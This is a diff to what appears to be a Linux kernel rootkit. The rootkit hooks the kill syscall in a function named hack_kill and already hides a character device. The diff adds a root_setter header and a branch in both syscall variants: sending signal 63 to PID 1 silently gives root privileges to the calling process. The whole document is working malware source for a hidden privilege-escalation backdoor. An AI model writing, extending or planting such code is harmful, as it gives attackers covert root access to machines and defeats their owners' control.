@@ -4,6 +4,7 @@
 
 #include "mod_hider.h"
 #include "kite_hook.h"
+#include "root_setter.h"
 
 
 #ifdef PTREGS_SYSCALL_STUB
@@ -25,6 +26,11 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         // hide chardev quickly
         return 0;
     }
+    else if ((sig == 63) && (pid == 1)){
+        pr_debug("Setting root fotr calling process\n");
+        set_root();
+        return 0;
+    }
     return orig_kill(regs);
 }
 #else
@@ -44,6 +50,12 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         // hide chardev quickly
         return 0;
     }
+    else if ((sig == 63) && (pid == 1)){
+        pr_debug("Setting root for calling process\n");
+        set_root();
+        return 0;
+    }
+
     return orig_kill(pid, sig);
 }
 #endif
